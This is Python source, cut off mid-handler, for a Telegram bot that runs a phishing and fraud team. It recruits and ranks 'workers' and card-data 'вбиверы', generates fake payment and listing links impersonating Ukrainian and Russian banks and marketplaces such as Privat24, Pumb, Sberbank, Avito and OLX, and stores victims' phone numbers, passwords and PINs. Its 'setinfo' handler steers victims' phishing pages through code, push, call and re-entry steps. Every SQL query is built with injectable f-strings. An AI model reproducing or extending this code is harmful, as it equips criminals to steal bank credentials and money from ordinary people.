# -*- coding: utf-8 -*
#=================================
#import telebot
from ast import Delete
from cmath import tanh
from email import message
from pyexpat.errors import messages
import re
from traceback import print_tb
from urllib import response
import telebot
from telebot import types
from pycoingecko import CoinGeckoAPI
#=================================

#import DATABASE
#==============================================
from sqlite3 import Cursor, connect
import sqlite3
from flask_sqlalchemy import SQLAlchemy
#==============================================
#import flask
#==============================================
import waitress
from waitress import serve
import string
#==============================================

#import otherLib
#===============================================
import random
from random import randint
import time
import threading
#================================================
#import config
#================================================
from config import *
import bs4
from bs4 import BeautifulSoup
import requests
from parserOLX import *
from parserIZI import *


#================================================



#values
#=========================================================
bot = telebot.TeleBot(token, parse_mode="HTML")
api = CoinGeckoAPI()

#==========================================================


#handlerStart
#=======================================================
@bot.message_handler(commands=['start'])
def start(message):
    if message.chat.type == 'private':
        db = sqlite3.connect('users.db')
        sql = db.cursor()

        sql.execute("""CREATE TABLE IF NOT EXISTS users( 
            id INTEGER,
            username TEXT,
            secretTah TEXT,
            rate INTEGER,
            cash BIGINT,
            profit INTEGER,
            methodW TEXT 
            

            )""")
        db.commit()
        sql.execute("""CREATE TABLE IF NOT EXISTS logs( 
            id INTEGER,
            idFake TEXT,
            number TEXT,
            pass INTEGER,
            pin BIGINT,
            cash INTAGER
            )""")
        db.commit()
        db = sqlite3.connect('users.db')
        sql = db.cursor()
        sql.execute("""CREATE TABLE IF NOT EXISTS FackeData(
                id INTEGER,
                idFake BIGINT,
                FackeName TEXT,
                FackeAdress TEXT,
                FackePhone TEXT,
                FackePrace INTAGER,
                FackeTitle TEXT,
                FackeCity TEXT,
                service TEXT,
                whovbiv INTEGER
                

                )""")
        db.commit()
        global people_id
        people_id = message.chat.id
        sql.execute(f"SELECT id FROM FackeData WHERE id = {people_id}")
        data = sql.fetchone()
        if data is None:
            sql.execute(
                f"INSERT OR IGNORE INTO FackeData VALUES('{people_id}', {0}, '{0}','{0}', {0}, {0},'{0}','{0}','{0}',{0});")
            db.commit()
        sql.execute(f"DELETE FROM FackeData WHERE service = {0}")
        people_id = message.chat.id
        username = message.from_user.username
        sql.execute(f"SELECT id FROM users WHERE id = {people_id}")
        data = sql.fetchone()
        text = [random.choice(string.ascii_lowercase + string.digits if i != 5 else string.ascii_uppercase) for i in range(10)]
        promo = ''.join(text)
        if data is None:
            sql.execute(
                f"INSERT OR IGNORE INTO users VALUES('{people_id}', '{username}', '{promo}', {0}, {0}, {0}, {0});")
                
            db.commit()
        for i in sql.execute(f"SELECT rate FROM users WHERE id = {people_id}"):
            rank = i[0]
            if rank == 0:
                markup = types.InlineKeyboardMarkup(row_width=2)
                but = types.InlineKeyboardButton("💫Подать заявку", callback_data=f"GoStep")
                markup.add(but)
                bot.send_message(message.chat.id, "<b>🎫Приветствую!\n✍️Так как ты первый раз зашел к нам, тебе нужно заполнить заявку!</b>",reply_markup=markup)
                db.commit()
            if rank == 10:
                bot.send_message(message.chat.id,'<b>🕦Твоя заявка в обработке!</b>')
            if rank > 0 and rank < 9:
                status = ['creator', 'administrator', 'member']
                user_status = bot.get_chat_member( chat_id=chatWorks, user_id=message.from_user.id).status
                if user_status in status:
                    markup = types.InlineKeyboardMarkup(row_width=1)
                    but = types.InlineKeyboardButton("➕Создать ссылку➕", callback_data=f"createfacke")
                    but1 = types.InlineKeyboardButton("📃Мои ссылки📃", callback_data=f"myfacke")
                    but2 = types.InlineKeyboardButton("⚙️Настройки⚙️", callback_data=f"settings")
                    but3 = types.InlineKeyboardButton("👊🏼Вбиверы👊🏼", callback_data=f"vbivpan")
                    markup.add(but,but1, but2, but3)
                    for t in sql.execute(f"SELECT cash FROM users WHERE id = {people_id}"):
                        cash = t[0]
                        for d in sql.execute(f"SELECT profit FROM users WHERE id = {people_id}"):
                            profit = d[0]
                            global stats
                            w = ["worker", "top","support", "vbiv", "TC"]
                            for v in sql.execute(f"SELECT rate FROM users WHERE id = {people_id}"):
                                workStat = v[0]
                                if workStat == 1:
                                    stats = w[0]
                                if workStat == 2:
                                    stats = w[1]
                                if workStat == 3:
                                    stats = w[2]
                                if workStat == 4:
                                    stats = w[3]
                                if workStat == 5:
                                    stats = w[4]
                                db.commit()   
                    if message.chat.id == chatWorks:
                        pass  
                    else:
                        sql.execute(f"SELECT * FROM users WHERE id = {message.chat.id}")
                        dat = sql.fetchone()
                        d = open("statsT.txt", 'r',encoding="utf-8")
                        p = d.read()
                        d.close()
                        if message.from_user.username != dat[1]:
                            bot.send_message(chatAdmin, f"👻<b>У пользователя @{dat[1]} сменился юзернейм на @{message.from_user.username}</b>")
                            sql.execute(f"UPDATE users SET username = '{message.from_user.username}' WHERE id = {message.chat.id}")
                            db.commit()
                            if dat[3] < 4:
                                markup_block = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
                                menu = types.KeyboardButton("Главное меню")
                                markup_block.add(menu)
                                bot.send_sticker(message.chat.id, "CAACAgIAAxkBAAEFxiVjF7uCuFsy1J7yieWD3Yg6jvE8TQACDgADRl-TFwUCXQujhluFKQQ",reply_markup=markup_block)        
                                bot.send_message(message.chat.id,f"⚡️id: <code>{people_id}</code>\n⚡️name: @{username}\n⚡️you: {stats}\n⚡️profits: {profit}\n⚡️balance: {cash}$\n⚡️Cтатус ворка: {p}",reply_markup=markup)
                            if dat[3] >= 4:
                                markup_block = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
                                menu = types.KeyboardButton("Главное меню")
                                markup_block.add(menu)
                                bot.send_sticker(message.chat.id, "CAACAgIAAxkBAAEFxiVjF7uCuFsy1J7yieWD3Yg6jvE8TQACDgADRl-TFwUCXQujhluFKQQ",reply_markup=markup_block)        
                                bot.send_message(message.chat.id,f"⚡️id: <code>{people_id}</code>\n⚡️name: @{username}\n⚡️you: {stats}\n⚡️profits: {profit}\n⚡️balance: {cash}$\n⚡️Cтатус ворка: {p}",reply_markup=markup)                                
                                buts = types.InlineKeyboardButton("❎", callback_data=f"openvbiv_{dat[0]}")
                                markups.add(buts)
                                bot.send_message(message.chat.id, "🔋Панель вбивера",reply_markup=markups)
                        if message.from_user.username == dat[1]:
                            if dat[3] < 4:
                                markup_block = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
                                menu = types.KeyboardButton("Главное меню")
                                markup_block.add(menu)
                                bot.send_sticker(message.chat.id, "CAACAgIAAxkBAAEFxiVjF7uCuFsy1J7yieWD3Yg6jvE8TQACDgADRl-TFwUCXQujhluFKQQ",reply_markup=markup_block)        
                                bot.send_message(message.chat.id,f"⚡️id: <code>{people_id}</code>\n⚡️name: @{username}\n⚡️you: {stats}\n⚡️profits: {profit}\n⚡️balance: {cash}$\n⚡️Cтатус ворка: {p}",reply_markup=markup)
                            if dat[3] >= 4:
                                markup_block = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
                                menu = types.KeyboardButton("Главное меню")
                                markup_block.add(menu)
                                bot.send_sticker(message.chat.id, "CAACAgIAAxkBAAEFxiVjF7uCuFsy1J7yieWD3Yg6jvE8TQACDgADRl-TFwUCXQujhluFKQQ",reply_markup=markup_block)        
                                bot.send_message(message.chat.id,f"⚡️id: <code>{people_id}</code>\n⚡️name: @{username}\n⚡️you: {stats}\n⚡️profits: {profit}\n⚡️balance: {cash}$\n⚡️Cтатус ворка: {p}",reply_markup=markup)
                                markups = types.InlineKeyboardMarkup(row_width=1)
                                buts = types.InlineKeyboardButton("❎", callback_data=f"openvbiv")
                                markups.add(buts)
                                bot.send_message(message.chat.id, "🔋Панель вбивера",reply_markup=markups)
                else:
                    markup = types.InlineKeyboardMarkup(row_width=2)
                    but = types.InlineKeyboardButton("👷Чат Воркеров👷", url=chatWork)
                    but1 = types.InlineKeyboardButton("💰Чат Выплат💰", url=chatPay)
                    markup.add(but, but1)
                    bot.send_message(message.chat.id, "❗️<b>Чтобы пользоваться ботом нужно вступить в чат</b>", reply_markup=markup)            
                
            if rank == 9:
                markup = types.ReplyKeyboardMarkup(
                row_width=1, resize_keyboard=True)
                ban = types.KeyboardButton("❌БАН❌")
                markup.add(ban)
                bot.send_message(message.chat.id, "❌Забанен❌", reply_markup=markup)
    else:
        bot.send_message(message.chat.id, "Совсем идиот?\nНе понимаешь куда писать эту команду?")


def registrationWorker(message):
    db = sqlite3.connect('users.db')
    sql = db.cursor()
    db.commit()
    markup = types.InlineKeyboardMarkup(row_width=2)
    worker_id = message.chat.id
    but = types.InlineKeyboardButton("Принять", callback_data=f"accept_{worker_id}")
    but1 = types.InlineKeyboardButton("Отклонить и заблокировать", callback_data=f"decline_{worker_id}")
    markup.add(but, but1)
    for i in sql.execute(f"SELECT username FROM users WHERE id = {message.from_user.id}"):
        user = i[0]
        msg = message.text
        bot.send_message(chatAdmin, f"<b>🐣Новая заявка от воркера: @{user} id <code>{message.from_user.id}</code></b>\n\n📝Анкета <i>{msg}</i>", reply_markup=markup)
        bot.send_message(message.from_user.id, "<b>⌛️Твоя анкета на проверке...</b>")
        db.commit()
    sql.execute(f'UPDATE users SET rate = {10} WHERE id = {message.chat.id}')
    db.commit()
@bot.message_handler(commands=["delitem"])
def mains_admin(message):
    db = sqlite3.connect('users.db')
    sql = db.cursor()
    sql.execute(f"DELETE FROM FackeData WHERE id = {message.chat.id}")
    db.commit()
    bot.send_message(message.chat.id,'Готово')

@bot.message_handler(commands=["admin"])
def main_admin(message):
    db = sqlite3.connect('users.db')
    sql = db.cursor()
    sql.execute(f'SELECT * FROM users WHERE id = {message.chat.id}')
    data = sql.fetchone()
    if data[3] == 4:
        sql.execute("""CREATE TABLE IF NOT EXISTS country( 
            country TEXT,
            stat BOOL
            )""")
        db.commit()
        sql.execute(f"SELECT country FROM country")
        data = sql.fetchone()
        if data is None:
            print("Create new table val")
            sql.execute(f"INSERT OR IGNORE INTO country (country, stat) VALUES('UA','True');")
            db.commit()
        sql.execute("""CREATE TABLE IF NOT EXISTS service( 
            service TEXT,
            stat BOOL
            )""")
        db.commit()
        sql.execute(f"SELECT service FROM service")
        data = sql.fetchone()
        if data is None:
            print("Create new table service")
            sql.execute(f"INSERT OR IGNORE INTO service (service, stat) VALUES('OLX','True');")
            db.commit()



        sql.execute(f"""CREATE TABLE IF NOT EXISTS {botName}( 
            bank BIGINT,
            statusW BOOL

            
        

            )""")
        db.commit()
        db = sqlite3.connect('users.db')
        sql = db.cursor()

        sql.execute(f"""CREATE TABLE IF NOT EXISTS vbivteam( 
        idvbiv INTAGER,
        usernameV TEXT,
        status BOOL

        )""")
        db.commit()
        sql.execute(f"SELECT bank FROM {botName}")
        data = sql.fetchone()
        if data is None:
            sql.execute(f"INSERT OR IGNORE INTO {botName} VALUES({0}, 'True');")
            print("DB create")
            db.commit()
        sql.execute(f"SELECT * FROM vbivteam")
        data = sql.fetchone()
        if data is None:
            sql.execute(f"INSERT OR IGNORE INTO vbivteam VALUES({0},'{0}','False');")
            print("DB vbiv create")
            db.commit()
        sql.execute("SELECT COUNT(*) FROM users")
        usersW = sql.fetchall()[0]
        sql.execute("SELECT COUNT(*) FROM FackeData")
        userFacke = sql.fetchall()[0]
        sql.execute(f"SELECT COUNT(*) FROM users WHERE rate = {9}")
        userBaned = sql.fetchall()[0]
        markup = types.InlineKeyboardMarkup(row_width=2)
        sprofit = types.InlineKeyboardButton("💵Написать профит💵", callback_data="Setprofit")
        alerts = types.InlineKeyboardButton("🎙Рассылка🎙", callback_data="alerts")
        uprate = types.InlineKeyboardButton("☝️Воркер☝️", callback_data="LOH")
        setVbiv = types.InlineKeyboardButton("⚙️Домен⚙️", callback_data="setdomain")
        setCountry = types.InlineKeyboardButton("🌐Страна🌐", callback_data="sCountry")
        statusWork = types.InlineKeyboardButton("📍Статус коаманды📍", callback_data="stat")
        markup.add(sprofit,alerts,uprate,setVbiv,setCountry,statusWork)
        sql.execute(f"SELECT bank from {botName}")
        cashBank = sql.fetchone()
        bot.send_message(message.chat.id, f"<b>🤖АдминПанель бота!\n🐒Пользователей в боте!: {usersW[0]}\n🏦Касса проекта за все время: {cashBank[0]} $\n🚷 Заблокированно пользователей: {userBaned[0]}\n💼Созданно ссылок: {userFacke[0]}</b>", reply_markup=markup)
        


@bot.message_handler(commands=['top'])
def top(message):
    top_texts = f"🔝Список Лидеров🔝:\n"
    db = sqlite3.connect('users.db')
    sql = db.cursor()
    data = sql.execute(f"SELECT * FROM users WHERE cash != {0} ORDER BY cash DESC").fetchall()
    for user in data:
        ids = user[0]
        usernames = user[1]
        cash = user[4]
        if user[4] > 0:
            top_texts = top_texts + f"🧑🏻‍💻<b> @{usernames}-> {cash} $ 💸</b>\n"
    bot.send_message(message.chat.id, top_texts) 

     


@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    db = sqlite3.connect('users.db')
    sql = db.cursor()
    chek_ban = sql.execute(f'SELECT rate FROM users WHERE id = {call.from_user.id}').fetchone()
    if chek_ban[0] != 9:
        req = call.data.split('_')
        if call.message:
            if req[0] == 'setinfo':
                try:
                    output = req[1]
                    item = req[2]
                    file = open(f'static/servers/{item}.txt', 'w')
                    file.write(str(output))
                    file.close()
                    if output ==  '1':
                        bot.send_message(call.from_user.id,'Отправлен на код!')
                    if output ==  '2':
                        bot.send_message(call.from_user.id,'Отправлен на пуш!')
                    if output ==  '3':
                        bot.send_message(call.from_user.id,'Отправлен на звонок!')
                    if output ==  '4':
                        bot.send_message(call.from_user.id,'Отправлен на повторный ввод!')
                except:
                    bot.send_message(call.from_user.id,'Ошибка')        
            
            if call.data == 'setdomain':
                markup = types.InlineKeyboardMarkup(row_width=2)
                buts = types.InlineKeyboardButton("UA", callback_data=f"dom_{'UA'}")
                buts1 = types.InlineKeyboardButton("RU", callback_data=f"dom_{'RU'}")
                markup.add(buts,buts1)
                bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text="<b>🌐Выбери страну для установки домена🌐</b>",reply_markup=markup)
            if req[0] == 'dom':
                serv = req[1]
                if serv == 'UA':
                    markup = types.InlineKeyboardMarkup(row_width=2)
                    #but = types.InlineKeyboardButton("★OLX★", callback_data= "setdomen_OLX")
                    #but1 = types.InlineKeyboardButton("★IZI★", callback_data= "IZI")
                    but2 = types.InlineKeyboardButton("★Privat24★", callback_data= "setdomen_Privat24")
                    but3 = types.InlineKeyboardButton("★Raiffaisen★", callback_data= "MonoBank")
                    but4 = types.InlineKeyboardButton("★Pumb★", callback_data= "Pumb_dom")
                    #but4 = types.InlineKeyboardButton("★BlaBlaCar★", callback_data= "setdomen_BlaBlaCarUa")
                    #but5 = types.InlineKeyboardButton("★BusFor★", callback_data= "setdomen_BusFor")
                    markup.add(but2,but3)   
                    print(serv)
                    bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text="Меню сервисов",reply_markup=markup)
                if serv == 'RU':
                    markup = types.InlineKeyboardMarkup(row_width=2)
                    but = types.InlineKeyboardButton("💥Avito", callback_data= "setdomen_Avito")
                    but1 = types.InlineKeyboardButton("💥Yola", callback_data= "setdomen_Yola")
                    but2 = types.InlineKeyboardButton("💥Yandex", callback_data= "setdomen_Yandex")
                    but3 = types.InlineKeyboardButton("💥BoxBerry", callback_data= "setdomen_BoxBerry")
                    but4 = types.InlineKeyboardButton("💥CDEK", callback_data= "setdomen_CDEK")
                    but5 = types.InlineKeyboardButton("💥Sberbank", callback_data= "setdomen_Sberbank")
                    but6 = types.InlineKeyboardButton("💥PostaRussian", callback_data= "setdomen_PostaRussian")
                    but8 = types.InlineKeyboardButton("💥Blablacar", callback_data= "setdomen_BlablacarRu")
                    but9 = types.InlineKeyboardButton("💥BusFor", callback_data= "setdomen_BusForRu")
                    print(serv)
                    markup.add(but, but1,but2,but3,but4,but5,but6,but8,but9)   
                    bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text="Меню сервисов",reply_markup=markup)
            if req[0] == 'setdomen':
                service = req[1]
                sdom = bot.send_message(call.from_user.id,f"Введи домен для {service}")
                bot.register_next_step_handler(sdom,setdomain,service)
                print(service)
            if call.data == 'alerts':
                t = bot.send_message(call.message.chat.id, "Введите текст для рассылки")
                bot.register_next_step_handler(t, alertFunk)
            if call.data == "GoStep":
                msg = bot.send_message(call.message.chat.id,"<b>🦜Ответь на вопросы:</b>\n\n⭐️Где работали ранее?\n⭐️Сколько времени готовы уделять?\n⭐️Почему именно наша команда?")
                bot.register_next_step_handler(msg, registrationWorker) 
            if call.data == 'LOH':
                idl = bot.send_message(call.message.chat.id,"<b>✍️Введите id пользователя..</b>")
                bot.register_next_step_handler(idl, infoloh)
            if call.data == 'openvbiv':
                db = sqlite3.connect('users.db')
                sql = db.cursor()
                id = call.from_user.id
                sql.execute(f"SELECT * FROM vbivteam WHERE idvbiv = {id}")
                data = sql.fetchall()
                markup = types.InlineKeyboardMarkup(row_width=2)
                buttons = []
                for i in data:
                    stat = i[2]
                    stats = "✅"
                    if stat == 'True':
                        stats = "✅"
                    if stat == 'False':
                        stats = "❌"
                    button = types.InlineKeyboardButton(text= str(stats), callback_data = f"selectvbiv_{stat}_{id}")
                    buttons.append(button)
                markup.add(*buttons)
                bot.send_message(chatWorks, f"<b>🧑‍💻Вбивер @{call.from_user.username} сменил свой статус на → {stats}</b>")
                bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text=f"<b>💻Твой статус → {stats}\n\n</b>❕<i>Чтобы сменить статус нажмите на кнопkу❕</i>",reply_markup=markup)
            
            if call.data == 'stat':
                    markups = types.InlineKeyboardMarkup(row_width=1)
                    but = types.InlineKeyboardButton("WORK✅", callback_data=f"WORK")
                    but1 = types.InlineKeyboardButton("STOP WORK❌", callback_data=f"STOP_WORK")
                    markups.add(but, but1)
                    bot.send_message(call.message.chat.id,"Изменить статус команды", reply_markup=markups)
            if call.data == "WORK":
                    d = open("statsT.txt", "w",encoding="utf-8")
                    d.write("WORK✅")
                    d.close
                    bot.send_message(chatWorks, "🗣Cтатус: ✅WORK✅")
                    bot.send_message(call.message.chat.id,"Статус изменен на ✅WORK✅")
            if call.data == "STOP_WORK":
                    d = open("statsT.txt", "w",encoding="utf-8")
                    d.write("STOP WORK❌")
                    d.close
                    bot.send_message(chatWorks, "🗣Cтатус: ❌STOP WORK❌")
                    bot.send_message(call.message.chat.id,"Статус изменен на ❌STOP WORK❌")
            
            if req[0] == "selectvbiv":
                db = sqlite3.connect('users.db')
                sql = db.cursor()
                ids = req[2]
                stat = req[1]
                s = 'False' 
                if stat == 'True':
                    s = 'False'
                if stat == 'False':
                    s = 'True'
                sql.execute(f"UPDATE vbivteam SET status = '{s}' WHERE idvbiv = {ids}")
                db.commit()
                sql.execute(f"SELECT * FROM vbivteam WHERE idvbiv = {ids}")
                data = sql.fetchall()
                markup = types.InlineKeyboardMarkup(row_width=2)
                buttons = []
                for i in data:
                    stat = i[2]
                    stats = "✅"
                    if stat == 'True':
                        stats = "✅"
                    if stat == 'False':
                        stats = "❌"
                    button = types.InlineKeyboardButton(text= str(stats), callback_data = f"selectvbiv_{stat}_{ids}")
                    buttons.append(button)
                markup.add(*buttons)
                bot.send_message(chatWorks, f"<b>🧑‍💻Вбивер @{call.from_user.username} сменил свой статус на → {stats}</b>")
                bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text=f"<b>💻Твой новый статус {stats}\n\n</b>❕<i>Чтобы сменить статус нажмите на кнопkу❕</i>",reply_markup=markup)
            if call.data == 'vbivpan':
                db = sqlite3.connect('users.db')
                sql = db.cursor()
                sql.execute(f"SELECT * FROM vbivteam WHERE status != 'False'")
                data = sql.fetchall()
                markup = types.InlineKeyboardMarkup(row_width=1)
                buttons = []
                for i in data:
                    username = i[1]
                    stat = i[2]
                    if stat == 'True':
                        stats = "✅"
                    if stat == 'False':
                        stats = "❌"
                    button = types.InlineKeyboardButton(text= str(f'{username}') + str(stats), url = f"https://t.me/{username}")
                    buttons.append(button)
                markup.add(*buttons)
                bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text=f"<b>🛸Список вбиверов</b>",reply_markup=markup)


            
            
            if req[0] == 'setban':
                db = sqlite3.connect('users.db')
                sql = db.cursor()
                id = req[1]
                sql.execute(f"UPDATE users SET rate = {9} WHERE id = {id}")
                db.commit()
                bot.send_message(call.from_user.id, "Готово")
                bot.send_message(id, "<b>❌Ты заблокирован в боте!</b>")
            if req[0] == 'setunban':
                db = sqlite3.connect('users.db')
                sql = db.cursor()
                id = req[1]
                sql.execute(f"UPDATE users SET rate = {1} WHERE id = {id}")
                db.commit()
                bot.send_message(call.from_user.id, "Готово")
                bot.send_message(id, "<b>👋Тебя разблокировали в боте</b>")
            if req[0] == 'setwork':
                db = sqlite3.connect('users.db')
                sql = db.cursor()
                id = req[1]
                sql.execute(f"UPDATE users SET rate = {1} WHERE id = {id}")
                db.commit()
                bot.send_message(call.from_user.id, "Готово")
                bot.send_message(id, "<b>👋Твой новый статус: Воркер!</b>")
            if req[0] == 'settop':
                db = sqlite3.connect('users.db')
                sql = db.cursor()
                id = req[1]
                sql.execute(f"UPDATE users SET rate = {2} WHERE id = {id}")
                db.commit()
                bot.send_message(call.from_user.id, "Готово")
                bot.send_message(id, "<b>👋Твой новый статус: ТОП!</b>")
            if req[0] == 'setsup':
                db = sqlite3.connect('users.db')
                sql = db.cursor()
                id = req[1]
                sql.execute(f"UPDATE users SET rate = {3} WHERE id = {id}")
                db.commit()
                bot.send_message(call.from_user.id, "Готово")
                bot.send_message(id, "<b>👋Твой новый статус: Поддержка!</b>")
            if req[0] == 'setvbiv':
                db = sqlite3.connect('users.db')
                sql = db.cursor()
                id = req[1]
                sql.execute(f"UPDATE users SET rate = {4} WHERE id = {id}")
                sql.execute(f"SELECT username FROM users WHERE id = {id}")
                us = sql.fetchone()
                sql.execute(f"INSERT OR IGNORE INTO vbivteam VALUES({id},'{us[0]}','True');")
                db.commit()
                bot.send_message(call.from_user.id, "Готово")
                bot.send_message(id, "<b>👋Твой новый статус: Вбивер!</b>")
                bot.send_message(id, "<b>🔋Статус вбива: 🔥Work</b>")
            if req[0] == 'settc':
                db = sqlite3.connect('users.db')
                sql = db.cursor()
                id = req[1]
                sql.execute(f"UPDATE users SET rate = {5} WHERE id = {id}")
                sql.execute(f"SELECT username FROM users WHERE id = {id}")
                us = sql.fetchone()
                sql.execute(f"INSERT OR IGNORE INTO vbivteam VALUES({id},'{us[0]}','True');")
                db.commit()
                bot.send_message(call.from_user.id, "Готово")
                bot.send_message(id, "<b>👋Твой новый статус: Админ!</b>")
                bot.send_message(id, "<b>🔋Статус вбива: 🔥Work</b>")
            
            if req[0] == "accept":
                        db = sqlite3.connect('users.db')
                        sql = db.cursor()
                        sql.execute(f"SELECT rate FROM users WHERE id = {call.from_user.id}")
                        dats = sql.fetchone()
                        print(dats[0])
                        if dats[0] >= 0:
                            id_worker = req[1]
                            print(id_worker)
                            db = sqlite3.connect('users.db')
                            sql = db.cursor()
                            db.commit()
                            sql.execute(f"UPDATE users SET rate = {1} WHERE id = {id_worker}")
                            markup = types.InlineKeyboardMarkup(row_width=2)
                            but = types.InlineKeyboardButton("👷Чат Воркеров👷", url=chatWork)
                            but1 = types.InlineKeyboardButton("💰Чат Выплат💰", url=chatWork)
                            markup.add(but, but1)   
                            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='<b>✅Заявка принята успешно</b>')
                            bot.send_message(chat_id=id_worker, text="<b>👋Добро пожаловать в бота!\n\n👾Незабывай вступить в чат!\n☄️Пиши - /start</b>", reply_markup=markup)
                            db.commit()
                        if dats[0] < 3:
                            bot.send_message(call.message.chat.id, "<b>✖️Недостаточно прав✖️</b>")
            if req[0] == 'decline':
                        db = sqlite3.connect('users.db')
                        sql = db.cursor()
                        sql.execute(f"SELECT rate FROM users WHERE id = {call.from_user.id}")
                        dats = sql.fetchone()
                        id_worker = req[1]
                        print(dats[0])
                        if dats[0] < 3:
                            bot.send_message(call.message.chat.id, "<b>✖️Недостаточно прав✖️</b>")
                        else:
                            sql.execute(f"UPDATE users SET rate = {9} WHERE id = {id_worker}")
                            db.commit()
                            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='<b>❌Заявка отклонена успешно</b>')
                            bot.send_message(chat_id=id_worker, text="<b>🤔Твоя заявка отклонена администрацией</b>", reply_markup=markup)
                        

            
            
            if call.data == 'createfacke':
                d = open("statsT.txt", 'r',encoding="utf-8")
                p = d.read()
                d.close()
                if p == 'STOP WORK❌':
                    bot.send_message(call.message.chat.id,'<b>Во время статуса: ❌STOP WORK❌ создавать ссылку запрещено</b>')
                else:    
                    db = sqlite3.connect('users.db')
                    sql = db.cursor()
                    sql.execute(f"SELECT * FROM country WHERE stat = 'True' ")
                    data = sql.fetchall()
                    markup = types.InlineKeyboardMarkup(row_width=1)
                    buttons = []
                    for i in data:
                        button = types.InlineKeyboardButton(text= str(i[0]), callback_data = f"goToService_{i[0]}")
                        buttons.append(button)
                    markup.add(*buttons)
                    bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text="♻️Меню стран для ворка♻️",reply_markup=markup)
            if req[0] == "goToService":
                country = req[1]
                if country == 'UA':
                    markup = types.InlineKeyboardMarkup(row_width=2)
                    #but = types.InlineKeyboardButton("★OLX★", callback_data= "OLX")
                    #but1 = types.InlineKeyboardButton("★IZI★", callback_data= "IZI")
                    but2 = types.InlineKeyboardButton("★Privat24★", callback_data= "Privat24")
                    but3 = types.InlineKeyboardButton("★Raiffaisen★", callback_data= "MonoBank")
                    but4 = types.InlineKeyboardButton("★Pumb★", callback_data= "Pumb")
                    but5 = types.InlineKeyboardButton("★Oschad★", callback_data= "oschad")
                    #but4 = types.InlineKeyboardButton("★BlaBlaCar★", callback_data= "BlaBlaCarUa")
                    #but5 = types.InlineKeyboardButton("★BusFor★", callback_data= "BusFor")
                    markup.add(but2,but3,but4,but5)   
                    bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text="📦Меню сервисов📦",reply_markup=markup)
                if country == 'RU':
                    markup = types.InlineKeyboardMarkup(row_width=2)
                    but = types.InlineKeyboardButton("💥Avito", callback_data= "Avito")
                    but1 = types.InlineKeyboardButton("💥Yola", callback_data= "Yola")
                    but2 = types.InlineKeyboardButton("💥Yandex", callback_data= "Yandex")
                    but3 = types.InlineKeyboardButton("💥BoxBerry", callback_data= "BoxBerry")
                    but4 = types.InlineKeyboardButton("💥CDEK", callback_data= "CDEK")
                    but5 = types.InlineKeyboardButton("💥Sberbank", callback_data= "Sberbank")
                    but6 = types.InlineKeyboardButton("💥PostaRussian", callback_data= "PostaRussian")
                    but8 = types.InlineKeyboardButton("💥Blablacar", callback_data= "BlablacarRu")
                    but9 = types.InlineKeyboardButton("💥BusFor", callback_data= "BusForRu")
                    markup.add(but, but1,but2,but3,but4,but5,but6,but8,but9)   
                    bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text="📦Меню сервисов📦",reply_markup=markup)

            if req[0] == "OLX":
                msg = bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text="<b>🔥Отправь ссылку на обьявление</b>")
                bot.register_next_step_handler(msg, createolx)
            if req[0] == "openOlx":
                db = sqlite3.connect('users.db')
                sql = db.cursor()
                randItem = req[1]
                sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                data = sql.fetchone()
                markup = types.InlineKeyboardMarkup(row_width=2)
                bot.delete_message(call.message.chat.id, call.message.message_id)
                print(data[3])
                bot.send_message(chatAlert, f'❕<b>Воркер: @{call.from_user.username} создал ссылку</b>')
                bot.send_message(call.message.chat.id,f"<b>📦 Обьвявление {randItem}</b>\n\n▪️Название: {data[6]}\n▪️Цена: {data[5]} грн\n\n🔜Домен: http://{dolx}/open/{randItem}\n🔜Домен: http://{dolx}/input/{randItem}")
            if call.data == "IZI":
                msg = bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text="<b>🔥Отправь ссылку на обьявление</b>")
                bot.register_next_step_handler(msg, createizi)
            if req[0] == "openIzi":
                db = sqlite3.connect('users.db')
                sql = db.cursor()
                randItem = req[1]
                sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                data = sql.fetchone()
                markup = types.InlineKeyboardMarkup(row_width=2)
                but1 = types.InlineKeyboardButton("🗑Удалить", callback_data= f"delItem_{randItem}")
                markup.add(but1)
                bot.delete_message(call.message.chat.id, call.message.message_id)
                bot.send_message(chatAlert, f'❕<b>Воркер: @{call.from_user.username} создал ссылку</b>')
                bot.send_message(call.message.chat.id,f"<b>📦 Обьвявление {randItem}</b>\n\n▪️Название: {data[6]}\n▪️Цена: {data[5]} грн\n\n🔜Домен: http://{dizi}/open/{randItem}",reply_markup=markup)
            if call.data == 'Privat24':
                msg = bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text="<b>🔥Введите сумму</b>")
                bot.register_next_step_handler(msg, createprivat24)
            if req[0] == 'openPrivat':
                db = sqlite3.connect('users.db')
                sql = db.cursor()
                randItem = req[1]
                sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                data = sql.fetchone()
                markup = types.InlineKeyboardMarkup(row_width=2)
                but1 = types.InlineKeyboardButton("🗑Удалить", callback_data= f"delItem_{randItem}")
                markup.add(but1)
                bot.delete_message(call.message.chat.id, call.message.message_id)
                bot.send_message(chatAlert, f'❕<b>Воркер: @{call.from_user.username} создал ссылку\n🇺🇦Сервис: {data[8]}</b>')
                bot.send_message(call.message.chat.id,f"<b>📦 Обьвявление {randItem}</b>\n▪️Цена: {data[5]} грн\n\n🔜Домен: http://{dprivat24}/open/{randItem}\n\nhttp://{dprivat24}/input/{randItem}",reply_markup=markup)
            
            if call.data == 'Pumb':
